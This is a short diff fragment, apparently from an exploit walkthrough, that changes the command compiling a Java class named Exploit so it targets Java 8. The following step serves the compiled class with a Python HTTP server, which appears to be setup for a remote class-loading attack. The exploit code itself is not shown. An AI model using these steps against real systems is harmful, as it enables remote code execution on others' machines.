@@ -516,7 +516,7 @@ public class Exploit {
 }
 
 Compile exploit to Javacode:
-javac Exploit.java
+javac Exploit.java --release 8
 
 Host Javacode with python:
 python3 -m http.server
